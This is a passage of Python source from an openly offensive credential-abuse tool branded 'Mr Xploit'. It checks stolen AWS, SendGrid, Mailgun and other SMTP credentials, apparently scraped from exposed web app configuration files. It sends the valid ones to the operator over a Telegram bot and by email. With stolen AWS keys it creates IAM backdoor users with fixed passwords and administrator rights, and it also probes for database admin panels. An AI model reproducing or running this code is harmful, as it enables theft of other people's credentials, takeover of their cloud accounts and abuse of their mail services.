        balance = client.get_send_quota()['Max24HourSend']
        message = {'text': f"🔥  Mr Xploit [AWS LIMIT]\n🏦 KEY= {ACCESS_KEY}\nSECRET= {SECRET_KEY}\nREGION= {REGION}\nLIMIT= {balance}\nAWS OK =>🟢\n"}
        requests.post("https://api.telegram.org/bot" + bot_token +"/sendMessage?chat_id=" + chat_id ,data=message)
        save = open('Result(Apache)/!AWS_key_live.txt', 'a')
        remover = str(balance).replace(',', '\n')
        save.write(str(ACCESS_KEY) + '|' + str(SECRET_KEY) + '|' + str(REGION) + '|' + str(balance)+'\n')
        save.close()
        print(f'{red}# {gr}[AWS QUOTA VALID] {cy}{ACCESS_KEY} {yl} ==> {red}{balance}')
    except:
        pass
def autocreate(ACCESS_KEY, SECRET_KEY, REGION):
    try:
        client = boto3.client('ses',
          aws_access_key_id=ACCESS_KEY,
          aws_secret_access_key=SECRET_KEY,
          region_name=REGION)
        response = client.get_send_quota()
        client2 = boto3.client('iam',
          aws_access_key_id=ACCESS_KEY,
          aws_secret_access_key=SECRET_KEY,
          region_name=REGION)
        response1 = client2.create_user(UserName='MrXploit552014')
        response2 = client2.create_login_profile(UserName='MrXploit552014',
          Password='MrXploit#20210285',
          PasswordResetRequired=False)
        response3 = client2.create_group(GroupName='AdminsDDefault')
        response4 = client2.attach_group_policy(GroupName='AdminsDDefault',
          PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
        response5 = client2.add_user_to_group(GroupName='AdminsDDefault',
          UserName='MrXploit552014')
        with lock:
            print(f'{gr}[#######]{cy}[AWS CRACK TOOL] {mg}{ACCESS_KEY} {yl} ==> {gr}Success Create User')
        save = open('Results/cracked_ses_from_awskey.txt', 'a')
        remover = str(response).replace(',', '\n')
        remover2 = str(response1).replace(',', '\n')
        save.write('ACCESS KEY : ' + ACCESS_KEY + '\nSECRET KEY : ' + SECRET_KEY + '\nREGION : ' + REGION + '\n\n==> Created User\n\n' + remover2 + '\n\n==> USER & PASS IAM USER\n\nUser : MrXploit\nPass : MrXploit#2021\n\n' + remover + '\n\n=================================\n\n')
        save.close()
        try:
            url = 'AWS CRACKER'
            sendtestoff(url, ACCESS_KEY, SECRET_KEY, REGION, remover2, remover)
        except:
            pass

    except Exception as e:
        try:
            with lock:
                print(f'{red}# {yl}[AWS CRACKER] {cy}{ACCESS_KEY} {yl} ==> {red}Failed Create User')
        except Exception as e:
            pass
def autocreateses(url, ACCESS_KEY, SECRET_KEY, REGION):
    try:
        client = boto3.client('ses',
          aws_access_key_id=ACCESS_KEY,
          aws_secret_access_key=SECRET_KEY,
          region_name=REGION)
        response = client.get_send_quota()
        client2 = boto3.client('iam',
          aws_access_key_id=ACCESS_KEY,
          aws_secret_access_key=SECRET_KEY,
          region_name=REGION)
        response1 = client2.create_user(UserName='MrXploit552014')
        response2 = client2.create_login_profile(UserName='MrXploit552014',
          Password='MrXploit#20210285',
          PasswordResetRequired=False)
        response3 = client2.create_group(GroupName='AdminsDDefault')
        response4 = client2.attach_group_policy(GroupName='AdminsDDefault',
          PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
        response5 = client2.add_user_to_group(GroupName='AdminsDDefault',
          UserName='MrXploit552014')
        print(f'{gr}[AWS CRACK TOOL] {mg}{ACCESS_KEY} {yl} ==> {gr}Success Create User')
        save = open('Results/!cracked_ses_from_awskey.txt', 'a')
        remover = str(response).replace(',', '\n')
        remover2 = str(response1).replace(',', '\n')
        save.write('ACCESS KEY : ' + str(ACCESS_KEY) + '\nSECRET KEY : ' + str(SECRET_KEY) + '\nREGION : ' + str(REGION) + '\n\n==> Created User\n\n' + str(remover2) + '\n\n==> USER & PASS IAM USER\n\nUser : MrXploit\nPass : MrXploit#2021\n\n' + str(remover) + '\n\n=================================\n\n')
        save.close()
        try:
            url = 'AWS CRACKER'
        except:
            pass
    except Exception as e:
        try:
            print(f'{red}# {yl}[AWS CRACKER] {cy}{ACCESS_KEY} {yl} ==> {red}Failed Create User')
        except Exception as e:
            pass
def autocreate2(ACCESS_KEY, SECRET_KEY, REGION):
    try:
        client = boto3.client('ses',
          aws_access_key_id=ACCESS_KEY,
          aws_secret_access_key=SECRET_KEY,
          region_name=REGION)
        response = client.get_send_quota()
        client2 = boto3.client('iam',
          aws_access_key_id=ACCESS_KEY,
          aws_secret_access_key=SECRET_KEY,
          region_name=REGION)
        response1 = client2.create_user(UserName='MrXploit00895')
        response2 = client2.create_login_profile(UserName='MrXploit00895',
          Password='WeAreMrXploit008#$',
          PasswordResetRequired=False)
        response3 = client2.create_group(GroupName='AdminsDDefault')
        response4 = client2.attach_group_policy(GroupName='AdminsDDefault',
          PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
        response5 = client2.add_user_to_group(GroupName='AdminsDDefault',
          UserName='MrXploit00895')
        with lock:
            print(f'{gr}[#######]{cy}[AWS CRACK TOOL] {mg}{ACCESS_KEY} {yl} ==> {gr}Success Create User')
        save = open('Result(Apache)/!cracked_ses_from_awskey.txt', 'a')
        remover = str(response).replace(',', '\n')
        remover2 = str(response1).replace(',', '\n')
        save.write('ACCESS KEY : ' + ACCESS_KEY + '\nSECRET KEY : ' + SECRET_KEY + '\nREGION : ' + REGION + '\n\n==> Created User\n\n' + remover2 + '\n\n==> USER & PASS IAM USER\n\nUser : MrXploit\nPass : MrXploit#2021\n\n' + remover + '\n\n=================================\n\n')
        save.close()
        try:
            url = 'AWS CRACKER'
            sendtestoff(url, ACCESS_KEY, SECRET_KEY, REGION, remover2, remover)
        except:
            pass

    except Exception as e:
        try:
            with lock:
                print(f'{red}# {yl}[AWS CRACKER] {cy}{ACCESS_KEY} {yl} ==> {red}Failed Create User')
        except Exception as e:
            pass
def autocreateses2(url, ACCESS_KEY, SECRET_KEY, REGION):
    try:
        client = boto3.client('ses',
          aws_access_key_id=ACCESS_KEY,
          aws_secret_access_key=SECRET_KEY,
          region_name=REGION)
        response = client.get_send_quota()
        client2 = boto3.client('iam',
          aws_access_key_id=ACCESS_KEY,
          aws_secret_access_key=SECRET_KEY,
          region_name=REGION)
        response1 = client2.create_user(UserName='MrXploit00895')
        response2 = client2.create_login_profile(UserName='MrXploit00895',
          Password='WeAreMrXploit008#$',
          PasswordResetRequired=False)
        response3 = client2.create_group(GroupName='AdminsDDefault')
        response4 = client2.attach_group_policy(GroupName='AdminsDDefault',
          PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
        response5 = client2.add_user_to_group(GroupName='AdminsDDefault',
          UserName='MrXploit00895')
        print(f'{gr}[AWS CRACK TOOL] {mg}{ACCESS_KEY} {yl} ==> {gr}Success Create User')
        save = open('Result(Apache)/!cracked_ses_from_awskey.txt', 'a')
        remover = str(response).replace(',', '\n')
        remover2 = str(response1).replace(',', '\n')
        save.write('ACCESS KEY : ' + str(ACCESS_KEY) + '\nSECRET KEY : ' + str(SECRET_KEY) + '\nREGION : ' + str(REGION) + '\n\n==> Created User\n\n' + str(remover2) + '\n\n==> USER & PASS IAM USER\n\nUser : MrXploit\nPass : MrXploit#2021\n\n' + str(remover) + '\n\n=================================\n\n')
        save.close()
        try:
            url = 'AWS CRACKER'
        except:
            pass
    except Exception as e:
        try:
            print(f'{red}# {yl}[AWS CRACKER] {cy}{ACCESS_KEY} {yl} ==> {red}Failed Create User')
        except Exception as e:
            pass
def ceker_sendgrid(f_url,f_key):
    try:
        hedd = {
            "Authorization":"Bearer {}".format(f_key),
            "Accept":"application/json"
        }
        go_to = requests.get('https://api.sendgrid.com/v3/user/credits',headers=hedd).json()
        if 'errors' in go_to:
            pass
        else:
            cekmail = requests.get('https://api.sendgrid.com/v3/user/email', headers=hedd).json()
            open("Results/!sendgrid_apikey_live.txt",'a').write("-"*30+"\nAPIKEY = {}\nLIMIT = {}\nREMAIN = {}\nFROM_MAIL = {}\n".format(f_key,go_to['total'],go_to['remain'],cekmail['email']))
            message = {'text': f"🔥  Mr Xploit [SENDGRID LIMIT]\n🏦 APIKEY = {f_key}\nLIMIT= {go_to['total']}\nREMAIN= {go_to['remain']}\nFROM_MAIL= {cekmail['email']}\nSENDGRID OK =>🟢\n"}
            requests.post("https://api.telegram.org/bot" + bot_token +"/sendMessage?chat_id=" + chat_id ,data=message)
            smtp_login(f_url,'env', 'smtp.sendgrid.net', '587', 'apikey', f_key, cekmail['email'])
    except:
        pass
def smtp_login(target, tutor, hostnya, portnya, usernya, pwnya,mail_fromer=False):
    hostnya = str(hostnya)
    portnya = str(portnya)
    usernya = str(usernya)
    pwnya = str(pwnya)
    if tutor == 'env':
        if mail_fromer:
            mail_from = mail_fromer
        else:
            ####### GET MAIL FROM ######
            try:
                if "MAIL_FROM_ADDRESS" in target:
                    try:
                        mail_from = re.findall('MAIL_FROM_ADDRESS=(.*?)\n', target)[0]
                        if '@' in mail_from:
                            if '\r' in mail_from:
                                mail_from = mail_from.replace('\r', '')
                            if mail_from.startswith('"') and mail_from.endswith('"'):
                                mail_from.replace('"', '')
                            if mail_from.startswith("'") and mail_from.endswith("'"):
                                mail_from.replace("'", '')
                        else:
                            mail_from = False
                    except:
                        mail_from = False
                elif "MAIL_FROM=" in target:
                    try:
                        mail_from = re.findall('MAIL_FROM=(.*?)\n', target)[0]
                        if '@' in mail_from:
                            if '\r' in mail_from:
                                mail_from = mail_from.replace('\r', '')
                            if mail_from.startswith('"') and mail_from.endswith('"'):
                                mail_from.replace('"', '')
                            if mail_from.startswith("'") and mail_from.endswith("'"):
                                mail_from.replace("'", '')
                        else:
                            mail_from = False
                    except:
                        mail_from = False
                elif "MAIL_ADDRESS" in target:
                    try:
                        mail_from = re.findall('MAIL_ADDRESS=(.*?)\n', target)[0]
                        if '@' in mail_from:
                            if '\r' in mail_from:
                                mail_from = mail_from.replace('\r', '')
                            if mail_from.startswith('"') and mail_from.endswith('"'):
                                mail_from.replace('"', '')
                            if mail_from.startswith("'") and mail_from.endswith("'"):
                                mail_from.replace("'", '')
                        else:
                            mail_from = False
                    except:
                        mail_from = False
                else:
                    mail_from = False
            except:
                mail_from = False
        ############################
        ###### GET MAIL NAME #######
        try:
            mail_name = re.findall('MAIL_FROM_NAME=(.*?)\n', target)[0]
            if '${APP_NAME}' in mail_name:
                mail_name = re.findall('APP_NAME=(.*?)\n', target)[0]
                if mail_name.startswith('"') and mail_name.endswith('"'):
                    mail_name = mail_name.replace('"', '')
                if mail_name.startswith("'") and mail_name.endswith("'"):
                    mail_name = mail_name.replace("'", '')
            else:
                if '\r' in mail_name:
                    mail_name = mail_name.replace('\r', '')
                    if mail_name.startswith('"') and mail_name.endswith('"'):
                        mail_name = mail_name.replace('"', '')
                    if mail_name.startswith("'") and mail_name.endswith("'"):
                        mail_name = mail_name.replace("'", '')
                else:
                    if mail_name.startswith('"') and mail_name.endswith('"'):
                        mail_name = mail_name.replace('"', '')
                    if mail_name.startswith("'") and mail_name.endswith("'"):
                        mail_name = mail_name.replace("'", '')
        except:
            mail_name = False
        ############################
    elif tutor == 'debug':
        try:
            mail_from = re.findall('<td>MAIL_FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>', target)[0]
            if '@' in mail_from:
                pass
            else:
                mail_from = False
        except:
            mail_from = False
        try:
            mail_name = re.findall('<td>MAIL_FROM_NAME<\/td>\s+<td><pre.*>(.*?)<\/span>', target)[0]
            if '${APP_NAME}' in mail_name:
                mail_name = re.findall('<td>APP_NAME<\/td>\s+<td><pre.*>(.*?)<\/span>', target)[0]
            else:
                mail_name = False
        except:
            mail_name = False
    msg = MIMEMultipart()
    msg['subject'] = 'MrXploit SMTP TEST!!'
    if mail_name:
        msg['from'] = mail_name
    else:
        msg['from'] = usernya
    if mail_from:
        sender = mail_from
    else:
        sender = usernya
    msg['to'] = email_receiver
    msg.add_header('Content-Type', 'text/html')
    if mail_name:
        msg.attach(MIMEText(
            'host => {}<br>port => {}<br>user => {}<br>password => {}<br>from mail => {}<br>from name => {} <br><br>SMTP Tested By MrXploit Tools'.format(
                hostnya, portnya, usernya, pwnya, sender, mail_name), 'html', 'utf-8'))
    else:
        msg.attach(MIMEText(
            'host => {}<br>port => {}<br>user => {}<br>password => {}<br>from mail => {}<br><br>SMTP Tested By MrXploit Tools'.format(
                hostnya, portnya, usernya, pwnya, sender), 'html', 'utf-8'))
    try:
        server = smtplib.SMTP(hostnya, int(portnya))
        server.login(usernya, pwnya)
        server.sendmail(sender, [msg['to']], msg.as_string())
        server.quit()
        if mail_name:
            open('Results/Smtp_Wor.txt', 'a').write(
                '{}|{}|{}|{}\n'.format(
                    hostnya, portnya, usernya, pwnya, sender, mail_name))
            message = {'text': f"☄️  Mr Xploit [SMTP Live]\n📪 {hostnya}|{portnya}|{usernya}|{pwnya}\nSending OK =>🟢\n"}
            requests.post("https://api.telegram.org/bot" + bot_token +"/sendMessage?chat_id=" + chat_id ,data=message)
        else:
            open('Results/Smtp_Wor.txt', 'a').write(
                '{}|{}|{}|{}\n'.format(
                    hostnya, portnya, usernya, pwnya, sender))

    except:
        try:
            server = smtplib.SMTP(hostnya, int(portnya))
            server.starttls()
            server.login(usernya, pwnya)
            server.sendmail(sender, [msg['to']], msg.as_string())
            server.quit()
            if mail_name:
                open('Results/Smtp_Wor.txt', 'a').write(
                    '{}|{}|{}|{}\n'.format(
                        hostnya, portnya, usernya, pwnya, sender, mail_name))
                message = {'text': f"☄️  Mr Xploit [SMTP Live]\n📪 {hostnya}|{portnya}|{usernya}|{pwnya}\nSending OK =>🟢\n"}
                requests.post("https://api.telegram.org/bot" + bot_token +"/sendMessage?chat_id=" + chat_id ,data=message)
            else:
                open('Results/Smtp_Wor.txt', 'a').write(
                    '{}|{}|{}|{}\n'.format(
                        hostnya, portnya, usernya, pwnya, sender))
        except:
            pass
def mail2(url, mailhost, mailport, mailuser, mailpass, mailfrom):
    if '465' in str(mailport):
        port = '587'
    else:
        port = str(mailport)
    smtp_server = str(mailhost)
    if '' in mailfrom:
        sender_email = mailuser
    else:
        sender_email = str(mailfrom.replace('"', ''))
    smtp_server = str(mailhost)
    login = str(mailuser.replace('"', ''))  # paste your login generated by Mailtrap
    password = str(mailpass.replace('"', '')) # paste your password generated by Mailtrap
    receiver_email = emailnow
    message = MIMEMultipart('alternative')
    message['Subject'] = f'📪Mr Xploit SMTP | {mailhost} '
    message['From'] = sender_email
    message['To'] = receiver_email
    text = '        '
    html = f" <h3>Mr Xploit smtps! - SMTP Data for you!</h3><br>{mailhost} <br><br><h5>Mailer  with from</h5><br>==================<br><i>{mailhost}:{mailport}:{mailuser}:{mailpass}:{mailfrom}:ssl::::0:</i><br>==================<br><br><h5>Mailer  Normal</h5><br>==================<br>{mailhost}:{mailport}:{mailuser}:{mailpass}::ssl::::0:<br>==================<br><br>        "
    part1 = MIMEText(text, 'plain')
    part2 = MIMEText(html, 'html')
    message.attach(part1)
    message.attach(part2)
    try:
        s = smtplib.SMTP(smtp_server, port)
        s.connect(smtp_server, port)
        s.ehlo()
        s.starttls()
        s.ehlo()
        s.login(login, password)
        s.sendmail(sender_email, receiver_email, message.as_string())
        message = {'text': f"☄️  Mr Xploit [SMTP Live]\n📪 {mailhost}|{mailport}|{mailuser}|{mailpass}\nFrom:{mailfrom}\nSending OK =>🟢\n"}
        requests.post("https://api.telegram.org/bot" + bot_token +"/sendMessage?chat_id=" + chat_id ,data=message)
        save = open('Results/!Valid_Smtps.txt', 'a')
        save.write(f'{mailhost}|{mailport}|{mailuser}|{mailpass}|{mailfrom}\n')
        save.close()
    except:
        pass
def sendmailgun(url, mailhost,mailport,mailuser,mailpass,mailfrom):
    if '465' in str(mailport):
        port = '587'
    else:
        port = str(mailport)
    smtp_server = str(mailhost)
    if '' in mailfrom:
        sender_email = mailuser
    else:
        sender_email = str(mailfrom.replace('"', ''))
    smtp_server = str(mailhost)
    login = str(mailuser.replace('"', ''))  # paste your login generated by Mailtrap
    password = str(mailpass.replace('"', ''))
    receiver_email = emailnow
    message = MIMEMultipart('alternative')
    message['Subject'] = f'📪 MailGun SMTP | {mailhost} '
    message['From'] = sender_email
    message['To'] = receiver_email
    text = '        '
    html = f" <html><body><center><h3>MrXploit SMTP </h3><p style='color:#FF0000'><b>Send by MrXploit</p><p>-------------------</p></center><table id='customers' class='table table-bordered table-hover'><thead><tr><th style='width: 25%'>URL</th><th style='width: 10%'>Host</th><th style='width: 10%'>Port</th><th style='width: 10%'>User</th><th style='width: 10%'>Pass</th><th style='width: 10%'>From</th></tr><tr><th style='width: 25%'></th><th style='width: 10%'>{mailhost}</th><th style='width: 10%'>{mailport}</th><th style='width: 10%'>{mailuser}</th><th style='width: 10%'>{mailpass}</th><th style='width: 10%'>{mailfrom}</th></tr></thead><tbody></tbody></table><br><p style='color:#00ff00'>SMTP Mailer :</p><b>{mailhost}:{mailport}:{mailuser}:{mailpass}::ssl::::0:</p><p style='color:#FF0000'>SMTP SMTP Tester:</p><b>{mailhost}|{mailport}|{mailuser}|{mailpass}</p></body></html>\n        "
    part1 = MIMEText(text, 'plain')
    part2 = MIMEText(html, 'html')
    message.attach(part1)
    message.attach(part2)
    try:
        s = smtplib.SMTP(smtp_server, port)
        s.connect(smtp_server, port)
        s.ehlo()
        s.starttls()
        s.ehlo()
        s.login(login, password)
        s.sendmail(sender_email, receiver_email, message.as_string())
        save = open('!Valid_Mailgun.txt', 'a')
        save.write(f'{mailhost}|{mailport}|{mailuser}|{mailpass}|{mailfrom}\n')
        save.close()
        print(f"{gr} Email sent")
    except:
        pass
def adminer(target, user, pw):
    try:
        if 'http://' in target:
            pol = 'http://' + parser_url(target)
        elif 'https://' in target:
            pol = 'https://' + parser_url(target)
        su = ['/Adminer.php', '/adminer.php']
        for pape in su:
            cc = requests.Session()
            go = cc.get(pol + pape, headers=head, timeout=12)
            if 'Login - Adminer' in go.text or 'class="jush-sql jsonly hidden"' in go.content:
                pass
    except:
        return False
def mail(url, mailhost, mailport, mailuser, mailpass, mailfrom):

    if 'sendgrid' in mailhost:
        try:
            mailfrom = str(mailfrom)
            toaddr = emailnow
            body = " SENDGRID smtps! - SMTP Data for you!\n{2} \n\nMailer  with from\n==================\n{0}:{1}:{2}:{3}:{4}:ssl::::0:\n==================\n\nMailer  Normal\n==================\n{0}:{1}:{2}:{3}::ssl::::0:\n==================".format(mailhost, mailport, mailuser, mailpass, mailfrom)
            mims = MIMEText(body, 'plain')
            msg = MIMEMultipart('alternative')
            msg['Subject'] = "SendGrid SMTP : [{}]".format(mailhost)
            msg['From'] = mailfrom
            msg['To'] = toaddr
            msg.attach(mims)
            if mailport == 465:
                smtp = smtplib.SMTP_SSL(mailhost, mailport)
            else:
                smtp = smtplib.SMTP(mailhost, mailport)
            smtp.ehlo()
            smtp.starttls()
            smtp.login(mailuser, mailpass)
            code = smtp.ehlo()[0]
            if not (200 <= code <= 299):
                code = smtp.helo()[0]
                if not (200 <= code <= 299):
                    raise SMTPHeloError(code, resp)
            smtp.sendmail(mailuser, toaddr, msg.as_string())
            message = {'text': f"☄️  Mr Xploit [SendGrid Live]\n📪 {mailhost}:{mailport}:{mailuser}:{mailpass}:{mailfrom}:ssl::::0:\nSending OK =>🟢\n"}
            requests.post("https://api.telegram.org/bot" + bot_token +"/sendMessage?chat_id=" + chat_id ,data=message)
            save = open('Results/!Valid_Smtps.txt', 'a')
            save.write(f'{mailhost}:{mailport}:{mailuser}:{mailpass}:{mailfrom}:ssl::::0:\n')
            save.close()
            return 'live'
        except Exception as e:
            #print('Error on line {}'.format(sys.exc_info()[-1].tb_lineno), type(e).__name__, e)
            return 'die'
    elif 'mailgun' in mailhost:
        try:
            mailfrom = str(mailfrom)
            toaddr = emailnow
            body = " MAILGUN smtps! - SMTP Data for you!\n{2} \n\nMailer  with from\n==================\n{0}:{1}:{2}:{3}:{4}:ssl::::0:\n==================\n\nMailer  Normal\n==================\n{0}:{1}:{2}:{3}::ssl::::0:\n==================".format(mailhost, mailport, mailuser, mailpass, mailfrom)
            mims = MIMEText(body, 'plain')
            msg = MIMEMultipart('alternative')
            msg['Subject'] = "MailGun SMTP : [{}]".format(mailhost)
            msg['From'] = mailfrom
            msg['To'] = toaddr
            msg.attach(mims)
            if mailport == 465:
                smtp = smtplib.SMTP_SSL(mailhost, mailport)
            else:
                smtp = smtplib.SMTP(mailhost, mailport)
            smtp.ehlo()
            smtp.starttls()
            smtp.login(mailuser, mailpass)
            code = smtp.ehlo()[0]
            if not (200 <= code <= 299):
                code = smtp.helo()[0]
                if not (200 <= code <= 299):
                    raise SMTPHeloError(code, resp)
            smtp.sendmail(mailuser, toaddr, msg.as_string())
            message = {'text': f"☄️  Mr Xploit [MailGun Live]\n📪 {mailhost}:{mailport}:{mailuser}:{mailpass}:{mailfrom}:ssl::::0:\nSending OK =>🟢\n"}
            requests.post("https://api.telegram.org/bot" + bot_token +"/sendMessage?chat_id=" + chat_id ,data=message)
            save = open('Results/!Valid_Smtps.txt', 'a')
            save.write(f'{mailhost}:{mailport}:{mailuser}:{mailpass}:{mailfrom}:ssl::::0:\n')
            save.close()
            return 'live'
        except Exception as e:
            #print('Error on line {}'.format(sys.exc_info()[-1].tb_lineno), type(e).__name__, e)
            return 'die'
    elif 'mandrillapp' in mailhost:
        try:
            mailfrom = str(mailfrom)
            toaddr = emailnow
            body = " MANDRILL smtps! - SMTP Data for you!\n{2} \n\nMailer  with from\n==================\n{0}:{1}:{2}:{3}:{4}:ssl::::0:\n==================\n\nMailer  Normal\n==================\n{0}:{1}:{2}:{3}::ssl::::0:\n==================".format(mailhost, mailport, mailuser, mailpass, mailfrom)
            mims = MIMEText(body, 'plain')
            msg = MIMEMultipart('alternative')
            msg['Subject'] = "MandDrill SMTP : [{}]".format(mailhost)
            msg['From'] = mailfrom
            msg['To'] = toaddr
            msg.attach(mims)
            if mailport == 465:
                smtp = smtplib.SMTP_SSL(mailhost, mailport)
            else:
                smtp = smtplib.SMTP(mailhost, mailport)
            smtp.ehlo()
            smtp.starttls()
            smtp.login(mailuser, mailpass)
            code = smtp.ehlo()[0]
            if not (200 <= code <= 299):
                code = smtp.helo()[0]
                if not (200 <= code <= 299):
                    raise SMTPHeloError(code, resp)
            smtp.sendmail(mailuser, toaddr, msg.as_string())
            message = {'text': f"☄️  Mr Xploit [ManDrillAPP Live]\n📪 {mailhost}:{mailport}:{mailuser}:{mailpass}:{mailfrom}:ssl::::0:\nSending OK =>🟢\n"}
            requests.post("https://api.telegram.org/bot" + bot_token +"/sendMessage?chat_id=" + chat_id ,data=message)
            save = open('Results/!Valid_Smtps.txt', 'a')
            save.write(f'{mailhost}:{mailport}:{mailuser}:{mailpass}:{mailfrom}:ssl::::0:\n')
            save.close()
            return 'live'
        except Exception as e:
            #print('Error on line {}'.format(sys.exc_info()[-1].tb_lineno), type(e).__name__, e)
            return 'die'
    elif 'mailjet' in mailhost:
        try:
            mailfrom = str(mailfrom)
            toaddr = emailnow
            body = " MAILJET smtps! - SMTP Data for you!\n{2} \n\nMailer  with from\n==================\n{0}:{1}:{2}:{3}:{4}:ssl::::0:\n==================\n\nMailer  Normal\n==================\n{0}:{1}:{2}:{3}::ssl::::0:\n==================".format(mailhost, mailport, mailuser, mailpass, mailfrom)
            mims = MIMEText(body, 'plain')
            msg = MIMEMultipart('alternative')
            msg['Subject'] = "MailJet SMTP : [{}]".format(mailhost)
            msg['From'] = mailfrom
            msg['To'] = toaddr
            msg.attach(mims)
            if mailport == 465:
                smtp = smtplib.SMTP_SSL(mailhost, mailport)
            else:
                smtp = smtplib.SMTP(mailhost, mailport)
            smtp.ehlo()
            smtp.starttls()
            smtp.login(mailuser, mailpass)
            code = smtp.ehlo()[0]
            if not (200 <= code <= 299):
                code = smtp.helo()[0]
                if not (200 <= code <= 299):
                    raise SMTPHeloError(code, resp)
            smtp.sendmail(mailuser, toaddr, msg.as_string())
            message = {'text': f"☄️  Mr Xploit [MailJet Live]\n📪 {mailhost}:{mailport}:{mailuser}:{mailpass}:{mailfrom}:ssl::::0:\nSending OK =>🟢\n"}
            requests.post("https://api.telegram.org/bot" + bot_token +"/sendMessage?chat_id=" + chat_id ,data=message)
            save = open('Results/!Valid_Smtps.txt', 'a')
            save.write(f'{mailhost}:{mailport}:{mailuser}:{mailpass}:{mailfrom}:ssl::::0:\n')
            save.close()
            return 'live'
        except Exception as e:
            #print('Error on line {}'.format(sys.exc_info()[-1].tb_lineno), type(e).__name__, e)
            return 'die'
    else:
        try:
            mailfrom = str(mailfrom)
            toaddr = emailnow
            body = " Normal smtps! - SMTP Data for you!\n{2} \n\nMailer  with from\n==================\n{0}:{1}:{2}:{3}:{4}:ssl::::0:\n==================\n\nMailer  Normal\n==================\n{0}:{1}:{2}:{3}::ssl::::0:\n==================".format(mailhost, mailport, mailuser, mailpass, mailfrom)
            mims = MIMEText(body, 'plain')
            msg = MIMEMultipart('alternative')
            msg['Subject'] = "MrXploit SMTP : [{}]".format(mailhost)
            msg['From'] = mailfrom
            msg['To'] = toaddr
            msg.attach(mims)
            if mailport == 465:
                smtp = smtplib.SMTP_SSL(mailhost, mailport)
            else:
                smtp = smtplib.SMTP(mailhost, mailport)
            smtp.ehlo()
            smtp.starttls()
            smtp.login(mailuser, mailpass)
            code = smtp.ehlo()[0]
            if not (200 <= code <= 299):
                code = smtp.helo()[0]
                if not (200 <= code <= 299):
                    raise SMTPHeloError(code, resp)
            smtp.sendmail(mailuser, toaddr, msg.as_string())
            message = {'text': f"☄️  Mr Xploit [SMTP Live]\n📪 {mailhost}:{mailport}:{mailuser}:{mailpass}:{mailfrom}:ssl::::0:\nSending OK =>🟢\n"}
            requests.post("https://api.telegram.org/bot" + bot_token +"/sendMessage?chat_id=" + chat_id ,data=message)
            save = open('Results/!Valid_Smtps.txt', 'a')
            save.write(f'{mailhost}:{mailport}:{mailuser}:{mailpass}:{mailfrom}:ssl::::0:\n')
            save.close()
            return 'live'
        except Exception as e:
            #print('Error on line {}'.format(sys.exc_info()[-1].tb_lineno), type(e).__name__, e)
            return 'die'
class pma():

    def __init__(self, url):
        self.url = url
        self.path = ['/phpmyadmin/']
        self.user_agent = 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1'
        if '://' not in self.url:
            self.url = ('http://{}').format(self.url)
        if self.url.endswith('/'):
            self.url = self.url[:-1]

    def check(self):
        back = False
        headers = {'User-Agent': self.user_agent}
        for i in self.path:
            try:
                url = ('{url}{path}').format(url=self.url, path=i)
                get = requests.get(url, headers=headers, verify=False, allow_redirects=False)
                if '200' in str(get.status_code):
                    back = url
                    break
            except:
                pass

        return back
class sendme():

    def mail(self,host, port, user, password, fromaddr):
        #print('\032[1;91m{}:{}:{}:{}:{}').format(host, port, user, password, fromaddr)
        if 'sendgrid' in host:
            try:
                fromaddr = fromaddr
                toaddr = emailnow
                body = "Mailer smtp\n{}:{}:{}:{}:{}:ssl::::0:".format(host, port, user, password,fromaddr)
                mims = MIMEText(body, 'plain')
                msg = MIMEMultipart('alternative')
                msg['Subject'] = "📪 Sendgrid SMTP [{}]".format(host)
                msg['From'] = fromaddr
                msg['To'] = toaddr
                msg.attach(mims)
                smtp = smtplib.SMTP(host, port)
                smtp.ehlo()
                smtp.starttls()
                smtp.login(user, password)
                code = smtp.ehlo()[0]
                if not (200 <= code <= 299):
                    code = smtp.helo()[0]
                    if not (200 <= code <= 299):
                        raise SMTPHeloError(code, resp)
                smtp.sendmail(user, toaddr, msg.as_string())
                return 'live'
            except Exception as e:
                #print('Error on line {}'.format(sys.exc_info()[-1].tb_lineno), type(e).__name__, e)
                return 'die'
        elif 'mandrillapp' in host:
            try:
                fromaddr = fromaddr
                toaddr = emailnow
                body = "Mailer smtp\n{}:{}:{}:{}:{}:ssl::::0:".format(host, port, user, password,user)
                mims = MIMEText(body, 'plain')
                msg = MIMEMultipart('alternative')
                msg['Subject'] = "📪 Mandrill SMTP [{}]".format(host)
                msg['From'] = fromaddr
                msg['To'] = toaddr
                msg.attach(mims)
                smtp = smtplib.SMTP(host, port)
                smtp.ehlo()
                smtp.starttls()
                smtp.login(user, password)
                code = smtp.ehlo()[0]
                if not (200 <= code <= 299):
                    code = smtp.helo()[0]
                    if not (200 <= code <= 299):
                        raise SMTPHeloError(code, resp)
                smtp.sendmail(user, toaddr, msg.as_string())
                return 'live'
            except Exception as e:
                #print('Error on line {}'.format(sys.exc_info()[-1].tb_lineno), type(e).__name__, e)
                return 'die'
        elif '.amazonaws.com' in host:
            try:
                fromaddr = fromaddr
                toaddr = emailnow
                body = "Mailer smtp\n{}:{}:{}:{}:{}:ssl::::0:".format(host, port, user, password,user)
                mims = MIMEText(body, 'plain')
                msg = MIMEMultipart('alternative')
                msg['Subject'] = "📪 AWS SMTP [{}]".format(host)
                msg['From'] = fromaddr
                msg['To'] = toaddr
                msg.attach(mims)
                smtp = smtplib.SMTP(host, port)
                smtp.ehlo()
                smtp.starttls()
                smtp.login(user, password)
                code = smtp.ehlo()[0]
                if not (200 <= code <= 299):
                    code = smtp.helo()[0]
                    if not (200 <= code <= 299):
                        raise SMTPHeloError(code, resp)
                smtp.sendmail(user, toaddr, msg.as_string())
                return 'live'
            except Exception as e:
                #print('Error on line {}'.format(sys.exc_info()[-1].tb_lineno), type(e).__name__, e)
                return 'die'
        elif 'mailgun' in host:
            try:
                fromaddr = fromaddr
                toaddr = emailnow
                body = "Mailer smtp\n{}:{}:{}:{}::ssl::::0:".format(host, port, user, password)
                mims = MIMEText(body, 'plain')
                msg = MIMEMultipart('alternative')
                msg['Subject'] = "📪 MailGun SMTP [{}]".format(host)
                msg['From'] = fromaddr
                msg['To'] = toaddr
                msg.attach(mims)
                smtp = smtplib.SMTP(host, port)
                smtp.ehlo()
                smtp.starttls()
